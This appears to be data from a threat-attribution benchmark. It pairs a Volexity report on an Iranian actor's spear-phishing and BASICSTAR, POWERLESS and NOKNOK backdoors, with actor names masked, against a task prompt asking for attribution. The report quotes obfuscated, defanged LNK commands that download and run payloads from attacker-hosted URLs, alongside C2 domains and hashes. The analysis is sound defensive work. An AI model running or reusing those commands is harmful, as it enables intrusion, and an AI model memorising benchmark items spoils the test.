is now strongly associated with [PLACEHOLDER] activity and the tool is installed on several of [PLACEHOLDER]’s servers.    Venom Proxy is a publicly available tool that is described as “a multi-hop proxy tool developed for penetration testers.” It is written in Go. It can be used to easily proxy network traffic to a multi-layer intranet, and easily manage intranet nodes. It has been associated with [PLACEHOLDER] since at least mid-2022, with Microsoft describing it as [PLACEHOLDER]’s “tool of choice” in an August 2022 blog. [PLACEHOLDER] tends to use a custom build of Venom Proxy in its activity.     Other tools used in this activity include:    Revsocks - A cross-platform SOCKS5 proxy server program/library written in C that can also reverse itself over a firewall.  AnyDesk - A legitimate remote desktop application. It and similar tools are often used by attackers to obtain remote access to computers on a network.   PowerShell - [PLACEHOLDER] makes heavy use of PowerShell, as well as PowerShell-based tools and scripts in its attacks. PowerShell is a Microsoft scripting tool that can be used to run commands, download payloads, traverse compromised networks, and carry out reconnaissance.  Custom keylogger
https://www.volexity.com/blog/2024/02/13/charmingcypress-innovating-persistence/	Through its managed security services offerings, Volexity routinely identifies spear-phishing campaigns targeting its customers. One persistent threat actor, whose campaigns Volexity frequently observes, is the Iranian-origin threat actor [PLACEHOLDER]. Volexity assesses that [PLACEHOLDER] is tasked with collecting political intelligence against foreign targets, particularly focusing on think tanks, NGOs, and journalists.    In their phishing campaigns, [PLACEHOLDER] often employs unusual social-engineering tactics, such as engaging targets in prolonged conversations over email before sending links to malicious content. In a particularly notable spear-phishing campaign observed by Volexity, [PLACEHOLDER] went so far as to craft an entirely fake webinar platform to use as part of the lure. [PLACEHOLDER] controlled access to this platform, requiring targets to install malware-laden VPN applications prior to granting access.    Malware Distribution Techniques  Spear Phishing  Throughout 2023, Volexity observed a wide range of spear-phishing activity conducted by [PLACEHOLDER]. This activity included spoofing individuals from different organizations, including the use of personas tied to media organizations and research institutions. In September and October 2023, [PLACEHOLDER] engaged in a series of spear-phishing attacks in which they masqueraded as the Rasanah International Institute for Iranian Studies (IIIS). [PLACEHOLDER] registered multiple, typo-squatted domains for use in these attacks that are similar to the organization’s actual domain, rasanah-iiis[.]org.    The image below shows an example of a spear phish sent by [PLACEHOLDER], in which the threat actor contacted a policy expert pretending to be an employee of the Rasanah Institute. The email invites the target to join a fake webinar.        This email demonstrates the following features:    An attempt to engage the target in a conversation, rather than immediately prompting them to open a malicious link or download malware  Impersonation of a real organization likely to be known by the target in order to construct a viable reason for the contact  The use of WhatsApp and Signal phone numbers, which are controlled by [PLACEHOLDER] and are offered as alternative methods of contacting the threat actor  Other spear-phish attempts by [PLACEHOLDER] in 2023 have involved one or more of the following:    URLs that start a redirection chain, culminating in the download of a RAR archive containing malicious shortcut (LNK) files  Use of compromised webmail accounts belonging to real contacts of the target  Use of multiple threat-actor controlled email accounts within the same phishing chain (which Proofpoint previously described as Multi-Persona Impersonation)  RAR + LNK Combo  In 2023 [PLACEHOLDER] often used RAR archives containing LNK files to deliver malware during spear-phishing campaigns. The infection chain from a recent campaign conducted by [PLACEHOLDER] is shown below.        After initial contact with the target was established and matured, an OnRender URL (hxxps://cloud-document-edit.onrender[.]com/page/jujbMKB[snipped]TpCNvV) was shared with the target. This URL redirected to a password-protected RAR file hosted on Supabase (hxxps://wulpfsrqupnuqorhexiw.supabase[.]co/storage/v1/object/public/StarPj/Items%20Shared.rar). The password for this RAR was shared in a subsequent email.    The RAR file contained two LNK files:    Name(s) The global consequences of the Israel-Hamas war - Shortcut.lnk  Size    1.9KB (1945 Bytes)  File Type       LNK  MD5     3fbf3ce1a9b452421970810bd6b6b37a  SHA1    729346dfdd2203a9943119bac03419d63554c4b8  Name(s) US strategy in the Middle East is coming into focus - Shortcut.lnk  Size    2.3KB (2371 Bytes)  File Type       LNK  MD5     78e4975dc56e62226f4c56850efb452b  SHA1    1f974d7634103536e524a41a79046785ca7ae3d6  The names of these files were copied from recent articles published by Atlantic Council in order to appeal to the victim. Each LNK has its own unique infection workflow. However, both will ultimately open a remotely-hosted decoy document and download a malware component. Both LNK files make use of string-replacement to obfuscate commands.    The following defanged command, embedded in The global consequences of the Israel-Hamas war - Shortcut.lnk, downloads and executes BASICSTAR, which is discussed in further detail later in this blog post.    /c set c=cu7rl --s7sl-no-rev7oke -s -d "id=VzXdED&Prog=2_Mal_vbs.txt&WH=The-global-.pdf" -X PO7ST hxxps://east-healthy-dress.glitch[.]me/Down -o %temp%\down.v7bs & call %c:7=% & set b=sta7rt "" "%temp%\down.v7bs" & call %b:7=%  The following defanged command, embedded in US strategy in the Middle East is coming into focus - Shortcut.lnk, downloads and executes KORKULOADER.    /c set fg=powershetsrll.exe -w 1 "$y=(wgetsrt -Urtsri httsrtps://wulpfsrqupnuqorhexiw.supabase[.]co/storage/v1/object/public/StarPj/AUN.txt -UseBatsrsicParsing).Cotsrntent; &(gctsrm *ketsr-e*)$y"; & call %fg:tsr=%  KORKULOADER is a very simple PowerShell downloader script that could not be used to obtain additional payloads at the time of investigation.    This infection chain was partially discussed in this recent Microsoft blog post.    Malware-laden VPN Applications  Another recent [PLACEHOLDER] spear-phishing campaign was developed on a technique reported by Proofpoint in July 2023 using a malware-laden VPN application to deploy malware. A high-level overview of the overall infection chain is shown below.        Emails containing a link to a fake webinar platform, and credentials to enable access to it, were distributed to a small number of targeted individuals. The platform was hosted on the following subdomains:    rasaaneh-iiis[.]org  rasaanah-iiis[.]org  Volexity identified emails sent using the following domains, which all mimic the legitimate rasanah-iiis[.]org domain:    rasaneh-iiis[.]org  rasaanah-iiis[.]org  rasaaneh-iiis[.]org  When users attempted to access the portal, it would check the supplied credentials. If the credentials were correct, it would then check the IP address used to access the portal. Only users running the attacker’s VPN client would successfully authenticate. If the IP address check failed, targets were prompted to download a VPN application, as shown below.        Depending on the user’s operating system (determined via the user-agent used to request the page), different applications would be served to the user. The resulting VPN client was a functional VPN client laden with malware. Windows victims would be served an infection chain culminating in POWERLESS, while macOS victims would be served an infection chain culminating in NOKNOK.    The Windows VPN application shown below establishes a connection to a [PLACEHOLDER]-controlled VPN endpoint using the supplied credentials and an OpenVPN configuration file.        When connected to this VPN, outbound network requests to the portal are routed through the VPN server. The macOS version achieves a similar VPN connection using the Apple utility networksetup to install a SOCKS proxy to the Wi-Fi network service via the following command:    networksetup -setsocksfirewallproxy wi-fi $serveradd $portnum  These proxy parameters are parsed from an OVPN configuration file that contains a legitimate OpenVPN configuration with additional non-standard fields containing data used by the client. The VPN server used was hosted at 49.13.15[.]66 on UDP port 1194.    Attempting to log on to the portal while connected to the VPN successfully passes the IP address check and allows access to the fake webinar portal.    Fake Webinar Portal  Inspecting the fake webinar portal shows the threat actor invested a significant level of effort. The portal includes the logo of the impersonated organization within a full web portal interface that includes a series of tabs:    Dashboard tab – information from the Profile and Meeting tabs  Profile tab – details of the logged in user including their picture, name, title and bio  Meeting tab – details of the supposed meeting to which the target was originally invited, including speakers, attendees and agenda    Storage tab – a variety of additional lure documents    Within the portal, profiles of 16 individuals were populated and associated with a specific webinar. Volexity reverse engineered the malware-laden VPN application and identified 16 sets of MD5-hashed credentials with usernames. When these credentials were cracked, they yielded plaintext usernames associated to individuals that Volexity assesses with high confidence were targets of this campaign. All 16 individuals are experts in policy regarding the Middle East.    Backdoors  POWERLESS  The backdoor deployed by the Windows variant of the malware-laden VPN application infection chain is called POWERLESS. Previous reporting by Check Point on POWERLESS has linked the tool to EDUCATED MANTICORE, a group Check Point assesses is “Iranian-aligned” and has “strong overlap with Phosphorous” (aka [PLACEHOLDER]). POWERLESS is a PowerShell backdoor that contains a broad feature set including the following:    AES-encrypted command-and-control (C2) communication using a key passed down from the server  Download of additional executables for audio recording, browser information stealing, persistence, and keylogging  Upload/download of files  Execution of files  Execution of shell commands  Screenshot capture  Telegram information theft  Update configuration of POWERLESS in memory, including modification of C2 address  These functions are largely the same as previously described by Check Point; however, the infection chain is slightly different. The malware-laden VPN application writes a malicious binary, VPN.exe (file details below), to the default OpenVPN directory and executes it. VPN.exe handles authentication via the supplied credentials and connection to the VPN.    Name(s) VPN.exe  Size    1.2MB (‍1250816 Bytes)  File Type       application/x-dosexec  MD5     266305f34477b679e171375e12e6880f  SHA1    607137996a8dc4d449185586ecfbe886e120e6b1  It also downloads a base64-encoded blob of data from the C2, writes this to disk at C:\Users\Public\vconf, and downloads a .NET binary named cfmon.exe (file details below). Persistence for cfmon.exe is achieved by adding a Shell registry entry in registry key HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Winlogon (see T1547.004 for more information on this technique).    Name(s) cfmon.exe  Size    119.0KB (121856 Bytes)  File Type       application/x-dosexec  MD5     859a9e523c3308c120e82068829fab84  SHA1    5bdec05bdca8176ae67054a3a7dc8c5ef0ac8deb  When executed, cfmon.exe first patches the AmsiScanBuffer and EtwEventWrite API functions to bypass them, replacing the initial function bytes. It then decrypts the AES-encrypted file vconf, retrieved by the previous binary, yielding an obfuscated PowerShell script. This PowerShell script is executed in memory. After deobfuscating this script, Volexity identified it as a new version of the POWERLESS malware. Details of the analyzed POWERLESS sample are below.    Name(s) N/A  Size    235.0KB (240620 Bytes)  File Type       text/plain  MD5     c3fe93fc9133c0bc4b441798b9bcf151  SHA1    87f36a0279b31a4a2f9b1123674e3dea130f1554  The C2 address used by this sample of POWERLESS is defaultbluemarker[.]info. The following domains could be trivially linked to this domain via shared SSL certificates and/or hosting infrastructure:    yellowparallelworld.ddns[.]net  beginningofgraylife.ddns[.]net  Volexity was able to obtain the three additional modules used by POWERLESS, which are further described below.    Browser Information Stealer  A browser information stealer module named blacksmith.exe can steal passwords, cookies and browser history.    Name(s) blacksmith.exe  Size    1.6MB (‍1651200 Bytes)  File Type       application/x-dosexec  MD5     9b6c308f106e72394a89fac083de9934  SHA1    27b38cf6667936c74ed758434196d2ac9d14deae  Persistence  A persistence module downloads an executable, oqeifvb.exe, from the C2, writes this to $env:windir\Temp\p\, and executes this via the Start-Process cmdlet. This module also passes the CLSID value of the legitimate scheduled task MsCtfMonitor to oqeifvb.exe. POWERLESS then maintains persistence by adding the HKCU\Environment\UserInitMprLogonScript registry entry with a value of oqeifvb.exe.    The purpose of oqeifvb.exe is to download another file, msedg.dll, and establish persistence for that file by hijacking the COM handler for the MsCtfMonitor scheduled task using the CLSID retrieved earlier. Volexity was not able to obtain the additional DLL and therefore assesses [PLACEHOLDER] likely limits deployment of this additional stage to victims who have been manually approved to receive it.    Name(s) oqeifvb.exe  Size    448.5KB (459264 Bytes)  File Type       application/x-dosexec  MD5     c79d85d0b9175cb86ce032543fe6b0d5  SHA1    195e939e0ae70453c0817ebca8049e51bbd4a825  Audio Recorder  An audio recorder module named AudioRecorder4.exe simply captures audio using the Windows API.    Name(s) AudioRecorder4.exe  Size    344.5KB (352768 Bytes)  File Type       application/x-dosexec  MD5     5fc8668f9c516c2b08f34675380e2a57  SHA1    c3fd8ed68c0ad2a97d76fc4430447581414e7a7e  NOKNOK  The backdoor deployed by the macOS version of the malware-laden VPN application infection chain is called NOKNOK. This is downloaded by the VPN application and executed in memory. The download mechanism is identical to that described by Proofpoint in their recent report. For example, the download URL for this bash script shares the same /DMPR/[alphanumeric string] format.        [PLACEHOLDER] delivers NOKNOK as a string that has been base64 encoded five times. The resulting script is the same as the previous version of the NOKNOK malware described by Proofpoint. The C2 used by this sample of NOKNOK is decorous-super-blender[.]glitch[.]me.    BASICSTAR  The backdoor deployed by the RAR + LNK infection chain is a previously undocumented backdoor that Volexity track as BASICSTAR. Details of the analyzed sample are below.    Name(s) down.vbs  Size    13.3KB (13652 Bytes)  File Type       application/octet-stream  MD5     2edea0927601ef443fc31f9e9f8e7a77  SHA1    cdce8a3e723c376fc87be4d769d37092e6591972  BASICSTAR has the following functionality:    Collect the computer name, username and operating system from compromised device. This information is reversed and base64 encoded before being passed to the C2 server.  Download a lure PDF from the C2 and open it.  Download the NirCmd command-line interface for execution of subsequent commands.  Enter a command loop, passing the collected information to the C2 and inspecting the returned result for a command.  Execute commands via the NirCmd command-line interface.  Remotely execute commands relayed from the C2 (see table below).  Command Function  kill    Delete update.vbs, a.vbs, and a.ps1, and then exit.  SetNewConfig    Set a new sleep timer for the command loop.  Module  Use ModuleTitle, ModuleName and Parameters to download a file, and execute this via NirCmd.  Volexity was not able to obtain the additional modules used by BASICSTAR. Interestingly, the cleanup command (kill) deletes three files that were not observed by Volexity (update.vbs, a.vbs, and a.ps1). These are likely Visual Basic and PowerShell scripts downloaded in subsequent components of the attack. This capability is in line with the same command in the POWERSTAR malware family.    Informations.vbs  The latest version of BASICSTAR observed by Volexity involved a Visual Basic script named Informations.vbs (see below).    Name(s) Informations.vbs  Size    21.6KB (22134 Bytes)  File Type       unknown  MD5     853687659483d215309941dae391a68f  SHA1    25005352eff725afc93214cac14f0aa8e58ca409  Volexity assesses with high confidence that this script is a BASICSTAR module with an internal name of Informations(sic). This module uses a variety of WMI queries to gather an extensive set of information about the compromised machine, including the following:    Installed antivirus products  Installed software  Information regarding the machine BIOS, hardware, manufacturer details, and disks  Network adapters and configurations  The BASICSTAR sample involved in this infection chain was configured to use the Glitch domain prism-west-candy[.]glitch[.]me as a C2.    Post-exploitation Activity & Investigation with Volexity Volcano  In one incident response case, Volexity gained some rare insight into additional tools [PLACEHOLDER] deploys if they successfully compromise a device. Volexity used Volexity Volcano to analyze memory from the compromised endpoint. Despite being protected by a popular endpoint detection and response (EDR) solution, Volcano quickly showed several obvious signs of compromise.    One of Volcano’s automated IOCs (“Bad Powershell”) triggered on a script extracted from event logs. The log contains references to some of the remote systems contacted by the script, including supabase[.]co. Furthermore, it identifies the PID of the powershell.exe process (13524) that executed this script, as shown below.        This powershell.exe instance was still running, with its parent tree intact. Components of the LNK payload that downloads BASICSTAR stood out in the command-line arguments, as shown below.        The process tree shows the interesting effect of string substitution. Both conhost.exe and cmd.exe contain obfuscated content, but the decoded arguments to powershell.exe were preserved in memory:    powershell  -w 1 $pnt=(Get-Content" -Path C:\Users\<redacted>\AppData\Roaming\Microsoft\documentLoger.txt);&(gcm "i*x)$pnt  Armed with knowledge of the documentLoger.txt path, Volexity reconstructed the entire contents from the system’s file cache, as shown below.        Another Volcano IOC (“Shortcut Execution”) brought attention to one of the LNK files, Draft-LSE.pdf.lnk, used in this attack. As shown below, this uses the icon from Microsoft Edge to trick end users.        Searching memory for the source of the LNK revealed an archive file named Draft-LSE (3).rar in the user’s Downloads folder, along with a valuable set of timestamps to triage the activity, although the (3) in the file name suggests this was not the first time the user downloaded this file. In the MFT-resident $DATA attribute, the ZoneTransfer record showed where the file originated, as shown below.        After just a few minutes of reviewing Volcano’s IOC hits and searching for related artifacts in both memory and files collected by Volexity Surge Collect Pro, Volexity analysts had nailed down the following evidence:    The initial infection vector and the website from where it was downloaded  How it persisted on the endpoint  The list of C2 hostnames  Timestamps when the activity took place  Many other IOCs to triage  Working folders used by the attacker on the compromised machine  Additional Tools Used by [PLACEHOLDER]  In the same investigation, Volexity identified additional tools used by [PLACEHOLDER] to facilitate data theft:    Nirsoft Chrome History Viewer  RATHOLE  SNAILPROXY  CommandCam  Command-line copies of WinRAR and 7-Zip  Volexity also identified a copy of EYEGLASS, the malware documented in a recent Microsoft post under the MediaPl backdoor section. In the case investigated by Volexity, EYEGLASS had been set up as the default handler for the TIF file extension. Encountering TIF files as part of the targeted user's day-to-day work would be unusual, and it is unlikely the attacker would want to randomly display a TIF on an already-infected device. Based on available evidence, Volexity assesses with high confidence that EYEGLASS was intended only as a backup C2 mechanism. In this scenario, if [PLACEHOLDER] lost access to the victim machine, they would try sending the user a specially crafted TIF file in order to regain access to the device if the user opened the file.	You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.  Threat Report: Through its managed security services offerings, Volexity routinely identifies spear-phishing campaigns targeting its customers. One persistent threat actor, whose campaigns Volexity frequently observes, is the Iranian-origin threat actor [PLACEHOLDER]. Volexity assesses that [PLACEHOLDER] is tasked with collecting political intelligence against foreign targets, particularly focusing on think tanks, NGOs, and journalists.    In their phishing campaigns, [PLACEHOLDER] often employs unusual social-engineering tactics, such as engaging targets in prolonged conversations over email before sending links to malicious content. In a particularly notable spear-phishing campaign observed by Volexity, [PLACEHOLDER] went so far as to craft an entirely fake webinar platform to use as part of the lure. [PLACEHOLDER] controlled access to this platform, requiring targets to install malware-laden VPN applications prior to granting access.    Malware Distribution Techniques  Spear Phishing  Throughout 2023, Volexity observed a wide range of spear-phishing activity conducted by [PLACEHOLDER]. This activity included spoofing individuals from different organizations, including the use of personas tied to media organizations and research institutions. In September and October 2023, [PLACEHOLDER] engaged in a series of spear-phishing attacks in which they masqueraded as the Rasanah International Institute for Iranian Studies (IIIS). [PLACEHOLDER] registered multiple, typo-squatted domains for use in these attacks that are similar to the organization’s actual domain, rasanah-iiis[.]org.    The image below shows an example of a spear phish sent by [PLACEHOLDER], in which the threat actor contacted a policy expert pretending to be an employee of the Rasanah Institute. The email invites the target to join a fake webinar.        This email demonstrates the following features:    An attempt to engage the target in a conversation, rather than immediately prompting them to open a malicious link or download malware  Impersonation of a real organization likely to be known by the target in order to construct a viable reason for the contact  The use of WhatsApp and Signal phone numbers, which are controlled by [PLACEHOLDER] and are offered as alternative methods of contacting the threat actor  Other spear-phish attempts by [PLACEHOLDER] in 2023 have involved one or more of the following:    URLs that start a redirection chain, culminating in the download of a RAR archive containing malicious shortcut (LNK) files  Use of compromised webmail accounts belonging to real contacts of the target  Use of multiple threat-actor controlled email accounts within the same phishing chain (which Proofpoint previously described as Multi-Persona Impersonation)  RAR + LNK Combo  In 2023 [PLACEHOLDER] often used RAR archives containing LNK files to deliver malware during spear-phishing campaigns. The infection chain from a recent campaign conducted by [PLACEHOLDER] is shown below.        After initial contact with the target was established and matured, an OnRender URL (hxxps://cloud-document-edit.onrender[.]com/page/jujbMKB[snipped]TpCNvV) was shared with the target. This URL redirected to a password-protected RAR file hosted on Supabase (hxxps://wulpfsrqupnuqorhexiw.supabase[.]co/storage/v1/object/public/StarPj/Items%20Shared.rar). The password for this RAR was shared in a subsequent email.    The RAR file contained two LNK files:    Name(s) The global consequences of the Israel-Hamas war - Shortcut.lnk  Size    1.9KB (1945 Bytes)  File Type       LNK  MD5     3fbf3ce1a9b452421970810bd6b6b37a  SHA1    729346dfdd2203a9943119bac03419d63554c4b8  Name(s) US strategy in the Middle East is coming into focus - Shortcut.lnk  Size    2.3KB (2371 Bytes)  File Type       LNK  MD5     78e4975dc56e62226f4c56850efb452b  SHA1    1f974d7634103536e524a41a79046785ca7ae3d6  The names of these files were copied from recent articles published by Atlantic Council in order to appeal to the victim. Each LNK has its own unique infection workflow. However, both will ultimately open a remotely-hosted decoy document and download a malware component. Both LNK files make use of string-replacement to obfuscate commands.    The following defanged command, embedded in The global consequences of the Israel-Hamas war - Shortcut.lnk, downloads and executes BASICSTAR, which is discussed in further detail later in this blog post.    /c set c=cu7rl --s7sl-no-rev7oke -s -d "id=VzXdED&Prog=2_Mal_vbs.txt&WH=The-global-.pdf" -X PO7ST hxxps://east-healthy-dress.glitch[.]me/Down -o %temp%\down.v7bs & call %c:7=% & set b=sta7rt "" "%temp%\down.v7bs" & call %b:7=%  The following defanged command, embedded in US strategy in the Middle East is coming into focus - Shortcut.lnk, downloads and executes KORKULOADER.    /c set fg=powershetsrll.exe -w 1 "$y=(wgetsrt -Urtsri httsrtps://wulpfsrqupnuqorhexiw.supabase[.]co/storage/v1/object/public/StarPj/AUN.txt -UseBatsrsicParsing).Cotsrntent; &(gctsrm *ketsr-e*)$y"; & call %fg:tsr=%  KORKULOADER is a very simple PowerShell downloader script that could not be used to obtain additional payloads at the time of investigation.    This infection chain was partially discussed in this recent Microsoft blog post.    Malware-laden VPN Applications  Another recent [PLACEHOLDER] spear-phishing campaign was developed on a technique reported by Proofpoint in July 2023 using a malware-laden VPN application to deploy malware. A high-level overview of the overall infection chain is shown below.        Emails containing a link to a fake webinar platform, and credentials to enable access to it, were distributed to a small number of targeted individuals. The platform was hosted on the following subdomains:    rasaaneh-iiis[.]org  rasaanah-iiis[.]org  Volexity identified emails sent using the following domains, which all mimic the legitimate rasanah-iiis[.]org domain:    rasaneh-iiis[.]org  rasaanah-iiis[.]org  rasaaneh-iiis[.]org  When users attempted to access the portal, it would check the supplied credentials. If the credentials were correct, it would then check the IP address used to access the portal. Only users running the attacker’s VPN client would successfully authenticate. If the IP address check failed, targets were prompted to download a VPN application, as shown below.        Depending on the user’s operating system (determined via the user-agent used to request the page), different applications would be served to the user. The resulting VPN client was a functional VPN client laden with malware. Windows victims would be served an infection chain culminating in POWERLESS, while macOS victims would be served an infection chain culminating in NOKNOK.    The Windows VPN application shown below establishes a connection to a [PLACEHOLDER]-controlled VPN endpoint using the supplied credentials and an OpenVPN configuration file.        When connected to this VPN, outbound network requests to the portal are routed through the VPN server. The macOS version achieves a similar VPN connection using the Apple utility networksetup to install a SOCKS proxy to the Wi-Fi network service via the following command:    networksetup -setsocksfirewallproxy wi-fi $serveradd $portnum  These proxy parameters are parsed from an OVPN configuration file that contains a legitimate OpenVPN configuration with additional non-standard fields containing data used by the client. The VPN server used was hosted at 49.13.15[.]66 on UDP port 1194.    Attempting to log on to the portal while connected to the VPN successfully passes the IP address check and allows access to the fake webinar portal.    Fake Webinar Portal  Inspecting the fake webinar portal shows the threat actor invested a significant level of effort. The portal includes the logo of the impersonated organization within a full web portal interface that includes a series of tabs:    Dashboard tab – information from the Profile and Meeting tabs  Profile tab – details of the logged in user including their picture, name, title and bio  Meeting tab – details of the supposed meeting to which the target was originally invited, including speakers, attendees and agenda    Storage tab – a variety of additional lure documents    Within the portal, profiles of 16 individuals were populated and associated with a specific webinar. Volexity reverse engineered the malware-laden VPN application and identified 16 sets of MD5-hashed credentials with usernames. When these credentials were cracked, they yielded plaintext usernames associated to individuals that Volexity assesses with high confidence were targets of this campaign. All 16 individuals are experts in policy regarding the Middle East.    Backdoors  POWERLESS  The backdoor deployed by the Windows variant of the malware-laden VPN application infection chain is called POWERLESS. Previous reporting by Check Point on POWERLESS has linked the tool to EDUCATED MANTICORE, a group Check Point assesses is “Iranian-aligned” and has “strong overlap with Phosphorous” (aka [PLACEHOLDER]). POWERLESS is a PowerShell backdoor that contains a broad feature set including the following:    AES-encrypted command-and-control (C2) communication using a key passed down from the server  Download of additional executables for audio recording, browser information stealing, persistence, and keylogging  Upload/download of files  Execution of files  Execution of shell commands  Screenshot capture  Telegram information theft  Update configuration of POWERLESS in memory, including modification of C2 address  These functions are largely the same as previously described by Check Point; however, the infection chain is slightly different. The malware-laden VPN application writes a malicious binary, VPN.exe (file details below), to the default OpenVPN directory and executes it. VPN.exe handles authentication via the supplied credentials and connection to the VPN.    Name(s) VPN.exe  Size    1.2MB (‍1250816 Bytes)  File Type       application/x-dosexec  MD5     266305f34477b679e171375e12e6880f  SHA1    607137996a8dc4d449185586ecfbe886e120e6b1  It also downloads a base64-encoded blob of data from the C2, writes this to disk at C:\Users\Public\vconf, and downloads a .NET binary named cfmon.exe (file details below). Persistence for cfmon.exe is achieved by adding a Shell registry entry in registry key HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Winlogon (see T1547.004 for more information on this technique).    Name(s) cfmon.exe  Size    119.0KB (121856 Bytes)  File Type       application/x-dosexec  MD5     859a9e523c3308c120e82068829fab84  SHA1    5bdec05bdca8176ae67054a3a7dc8c5ef0ac8deb  When executed, cfmon.exe first patches the AmsiScanBuffer and EtwEventWrite API functions to bypass them, replacing the initial function bytes. It then decrypts the AES-encrypted file vconf, retrieved by the previous binary, yielding an obfuscated PowerShell script. This PowerShell script is executed in memory. After deobfuscating this script, Volexity identified it as a new version of the POWERLESS malware. Details of the analyzed POWERLESS sample are below.    Name(s) N/A  Size    235.0KB (240620 Bytes)  File Type       text/plain  MD5     c3fe93fc9133c0bc4b441798b9bcf151  SHA1    87f36a0279b31a4a2f9b1123674e3dea130f1554  The C2 address used by this sample of POWERLESS is defaultbluemarker[.]info. The following domains could be trivially linked to this domain via shared SSL certificates and/or hosting infrastructure:    yellowparallelworld.ddns[.]net  beginningofgraylife.ddns[.]net  Volexity was able to obtain the three additional modules used by POWERLESS, which are further described below.    Browser Information Stealer  A browser information stealer module named blacksmith.exe can steal passwords, cookies and browser history.    Name(s) blacksmith.exe  Size    1.6MB (‍1651200 Bytes)  File Type       application/x-dosexec  MD5     9b6c308f106e72394a89fac083de9934  SHA1    27b38cf6667936c74ed758434196d2ac9d14deae  Persistence  A persistence module downloads an executable, oqeifvb.exe, from the C2, writes this to $env:windir\Temp\p\, and executes this via the Start-Process cmdlet. This module also passes the CLSID value of the legitimate scheduled task MsCtfMonitor to oqeifvb.exe. POWERLESS then maintains persistence by adding the HKCU\Environment\UserInitMprLogonScript registry entry with a value of oqeifvb.exe.    The purpose of oqeifvb.exe is to download another file, msedg.dll, and establish persistence for that file by hijacking the COM handler for the MsCtfMonitor scheduled task using the CLSID retrieved earlier. Volexity was not able to obtain the additional DLL and therefore assesses [PLACEHOLDER] likely limits deployment of this additional stage to victims who have been manually approved to receive it.    Name(s) oqeifvb.exe  Size    448.5KB (459264 Bytes)  File Type       application/x-dosexec  MD5     c79d85d0b9175cb86ce032543fe6b0d5  SHA1    195e939e0ae70453c0817ebca8049e51bbd4a825  Audio Recorder  An audio recorder module named AudioRecorder4.exe simply captures audio using the Windows API.    Name(s) AudioRecorder4.exe  Size    344.5KB (352768 Bytes)  File Type       application/x-dosexec  MD5     5fc8668f9c516c2b08f34675380e2a57  SHA1    c3fd8ed68c0ad2a97d76fc4430447581414e7a7e  NOKNOK  The backdoor deployed by the macOS version of the malware-laden VPN application infection chain is called NOKNOK. This is downloaded by the VPN application and executed in memory. The download mechanism is identical to that described by Proofpoint in their recent report. For example, the download URL for this bash script shares the same /DMPR/[alphanumeric string] format.        [PLACEHOLDER] delivers NOKNOK as a string that has been base64 encoded five times. The resulting script is the same as the previous version of the NOKNOK malware described by Proofpoint. The C2 used by this sample of NOKNOK is decorous-super-blender[.]glitch[.]me.    BASICSTAR  The backdoor deployed by the RAR + LNK infection chain is a previously undocumented backdoor that Volexity track as BASICSTAR. Details of the analyzed sample are below.    Name(s) down.vbs  Size    13.3KB (13652 Bytes)  File Type       application/octet-stream  MD5     2edea0927601ef443fc31f9e9f8e7a77  SHA1    cdce8a3e723c376fc87be4d769d37092e6591972  BASICSTAR has the following functionality:    Collect the computer name, username and operating system from compromised device. This information is reversed and base64 encoded before being passed to the C2 server.  Download a lure PDF from the C2 and open it.  Download the NirCmd command-line interface for execution of subsequent commands.  Enter a command loop, passing the collected information to the C2 and inspecting the returned result for a command.  Execute commands via the NirCmd command-line interface.  Remotely execute commands relayed from the C2 (see table below).  Command Function  kill    Delete update.vbs, a.vbs, and a.ps1, and then exit.  SetNewConfig    Set a new sleep timer for the command loop.  Module  Use ModuleTitle, ModuleName and Parameters to download a file, and execute this via NirCmd.  Volexity was not able to obtain the additional modules used by BASICSTAR. Interestingly, the cleanup command (kill) deletes three files that were not observed by Volexity (update.vbs, a.vbs, and a.ps1). These are likely Visual Basic and PowerShell scripts downloaded in subsequent components of the attack. This capability is in line with the same command in the POWERSTAR malware family.    Informations.vbs  The latest version of BASICSTAR observed by Volexity involved a Visual Basic script named Informations.vbs (see below).    Name(s) Informations.vbs  Size    21.6KB (22134 Bytes)  File Type       unknown  MD5     853687659483d215309941dae391a68f  SHA1    25005352eff725afc93214cac14f0aa8e58ca409  Volexity assesses with high confidence that this script is a BASICSTAR module with an internal name of Informations(sic). This module uses a variety of WMI queries to gather an extensive set of information about the compromised machine, including the following:    Installed antivirus products  Installed software  Information regarding the machine BIOS, hardware, manufacturer details, and disks  Network adapters and configurations  The BASICSTAR sample involved in this infection chain was configured to use the Glitch domain prism-west-candy[.]glitch[.]me as a C2.    Post-exploitation Activity & Investigation with Volexity Volcano  In one incident response case, Volexity gained some rare insight into additional tools [PLACEHOLDER] deploys if they successfully compromise a device. Volexity used Volexity Volcano to analyze memory from the compromised endpoint. Despite being protected by a popular endpoint detection and response (EDR) solution, Volcano quickly showed several obvious signs of compromise.    One of Volcano’s automated IOCs (“Bad Powershell”) triggered on a script extracted from event logs. The log contains references to some of the remote systems contacted by the script, including supabase[.]co. Furthermore, it identifies the PID of the powershell.exe process (13524) that executed this script, as shown below.        This powershell.exe instance was still running, with its parent tree intact. Components of the LNK payload that downloads BASICSTAR stood out in the command-line arguments, as shown below.        The process tree shows the interesting effect of string substitution. Both conhost.exe and cmd.exe contain obfuscated content, but the decoded arguments to powershell.exe were preserved in memory:    powershell  -w 1 $pnt=(Get-Content" -Path C:\Users\<redacted>\AppData\Roaming\Microsoft\documentLoger.txt);&(gcm "i*x)$pnt  Armed with knowledge of the documentLoger.txt path, Volexity reconstructed the entire contents from the system’s file cache, as shown below.        Another Volcano IOC (“Shortcut Execution”) brought attention to one of the LNK files, Draft-LSE.pdf.lnk, used in this attack. As shown below, this uses the icon from Microsoft Edge to trick end users.        Searching memory for the source of the LNK revealed an archive file named Draft-LSE (3).rar in the user’s Downloads folder, along with a valuable set of timestamps to triage the activity, although the (3) in the file name suggests this was not the first time the user downloaded this file. In the MFT-resident $DATA attribute, the ZoneTransfer record showed where the file originated, as shown below.        After just a few minutes of reviewing Volcano’s IOC hits and searching for related artifacts in both memory and files collected by Volexity Surge Collect Pro, Volexity analysts had nailed down the following evidence:    The initial infection vector and the website from where it was downloaded  How it persisted on the endpoint  The list of C2 hostnames  Timestamps when the activity took place  Many other IOCs to triage  Working folders used by the attacker on the compromised machine  Additional Tools Used by [PLACEHOLDER]  In the same investigation, Volexity identified additional tools used by [PLACEHOLDER] to facilitate 